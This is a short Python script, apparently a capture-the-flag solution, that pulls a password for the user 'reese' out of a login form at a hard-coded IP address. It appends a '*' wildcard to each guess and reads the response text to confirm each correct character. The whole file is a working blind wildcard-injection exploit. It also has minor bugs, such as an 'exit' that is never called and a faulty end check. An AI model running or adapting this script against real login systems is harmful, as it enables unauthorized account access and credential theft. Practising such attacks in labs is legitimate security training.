import requests
import csv

target = "http://178.62.18.46:30259/login"
pwd = ""
unc_char = range(32, 127) #ASCII Chars
s = requests.Session()

def brute(password):
    global pwd
    payload = {
        'username': "reese",
        'password': password + "*"
    }
    r = s.post(target, data = payload)
    if r.text.find("No search results") != -1: #Return true if match is found. The response is HTTP 200 and "No Search Results" if its found
        pwd = password
        print("Match Found :", password)
        return True
    else:
        if pwd[:-1] == "}": #Condition to end the script
            exit
        return False #Return false if match is not found

while True:
    for i in unc_char:
        if i == 42: #Skip * character
            pass
        else:
            try_pwd = ""
            try_pwd += pwd + chr(i)
            print(try_pwd)
            if brute(try_pwd): #Check return value of brute
                break


# for username, password in 
# brute("asdf", "asdf")
